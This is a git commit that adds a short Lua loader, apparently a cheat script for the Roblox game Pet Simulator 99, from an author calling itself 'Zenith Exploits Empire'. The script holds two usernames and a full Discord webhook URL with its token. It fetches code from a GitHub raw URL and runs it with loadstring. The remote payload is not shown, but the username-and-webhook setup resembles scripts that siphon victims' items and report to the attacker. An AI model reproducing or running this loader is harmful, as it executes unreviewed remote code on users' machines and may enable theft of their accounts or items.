d279454c13e3e146f496dc5e809c255873003947
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-20 10:22:42 +0200

    Added ps99 script: HugeHunter

---
+++ ps99/HugeHunter.lua
@@ -0,0 +1,5 @@
+Username = "NoobToProAut33"
+Username2 = "NoobToProAut33"
+Webhook = "https://discord.com/api/webhooks/1363404868991193099/u_Vd3kOUSyOAtbrPqA6tDJgq7bbS2WZ203sxd5cc92_VGF0dCNITLpYlxPTmrq1mnGMr"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
